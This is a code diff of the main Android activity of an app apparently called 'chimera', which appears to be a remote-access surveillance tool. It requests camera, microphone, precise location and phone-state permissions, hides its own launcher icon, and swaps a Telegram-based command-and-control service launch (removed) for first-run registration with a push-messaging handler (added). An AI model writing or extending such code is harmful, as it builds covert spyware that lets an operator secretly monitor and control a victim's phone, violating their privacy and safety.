@@ -1,8 +1,7 @@
 package com.chimera;
 
 import android.Manifest;
-import android.content.ComponentName;
-import android.content.Intent;
+import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
@@ -16,6 +15,7 @@ import java.util.List;
 
 public class MainActivity extends AppCompatActivity {
     private static final int REQ_CODE = 101;
+    private static final String FIRST_RUN_PREF = "isFirstRun";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -26,46 +26,44 @@ public class MainActivity extends AppCompatActivity {
         Button btnHide = findViewById(R.id.btnHide);
 
         btnContinue.setOnClickListener(v -> requestPerms());
-
         btnHide.setOnClickListener(v -> {
-            try {
-                PackageManager pm = getPackageManager();
-                ComponentName cn = new ComponentName(MainActivity.this, MainActivity.class);
-                pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-                Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
-            } catch (Exception e) {
-                ErrorLogger.logError(MainActivity.this, "MainActivity_HideClick", e);
-            }
+            DeviceControlHandler.setComponentState(this, false);
+            Toast.makeText(MainActivity.this, "Icon Hidden", Toast.LENGTH_SHORT).show();
         });
+
+        handleFirstRunRegistration();
+    }
+
+    private void handleFirstRunRegistration() {
+        SharedPreferences prefs = getSharedPreferences("chimera_prefs", MODE_PRIVATE);
+        boolean isFirstRun = prefs.getBoolean(FIRST_RUN_PREF, true);
+        if (isFirstRun) {
+            FCMHandlerService.registerDevice(this);
+            prefs.edit().putBoolean(FIRST_RUN_PREF, false).apply();
+        }
     }
 
     private void requestPerms() {
         try {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                List<String> permsToRequest = new ArrayList<>();
-                permsToRequest.add(Manifest.permission.CAMERA);
-                permsToRequest.add(Manifest.permission.RECORD_AUDIO);
-                permsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION);
-                permsToRequest.add(Manifest.permission.READ_PHONE_STATE);
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                    permsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
+            List<String> permsToRequest = new ArrayList<>();
+            permsToRequest.add(Manifest.permission.CAMERA);
+            permsToRequest.add(Manifest.permission.RECORD_AUDIO);
+            permsToRequest.add(Manifest.permission.ACCESS_FINE_LOCATION);
+            permsToRequest.add(Manifest.permission.READ_PHONE_STATE);
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                permsToRequest.add(Manifest.permission.POST_NOTIFICATIONS);
+            }
+            List<String> neededPerms = new ArrayList<>();
+            for (String p : permsToRequest) {
+                if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
+                    neededPerms.add(p);
                 }
-
-                List<String> neededPerms = new ArrayList<>();
-                for (String p : permsToRequest) {
-                    if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
-                        neededPerms.add(p);
-                    }
-                }
-
-                if (!neededPerms.isEmpty()) {
-                    ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
-                } else {
-                    startC2Service();
-                }
+            }
+            if (!neededPerms.isEmpty()) {
+                ActivityCompat.requestPermissions(this, neededPerms.toArray(new String[0]), REQ_CODE);
             } else {
-                startC2Service();
+                Toast.makeText(this, "Permissions already granted.", Toast.LENGTH_SHORT).show();
+                finish();
             }
         } catch (Exception e) {
             ErrorLogger.logError(this, "MainActivity_RequestPerms", e);
@@ -73,24 +71,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
     @Override
-    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
+    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == REQ_CODE) {
-            startC2Service();
-        }
-    }
-
-    private void startC2Service() {
-        try {
-            Intent serviceIntent = new Intent(this, TelegramC2Service.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
+            Toast.makeText(this, "Setup complete.", Toast.LENGTH_SHORT).show();
             finish();
-        } catch (Exception e) {
-            ErrorLogger.logError(this, "MainActivity_StartTelegram", e);
         }
     }
 }
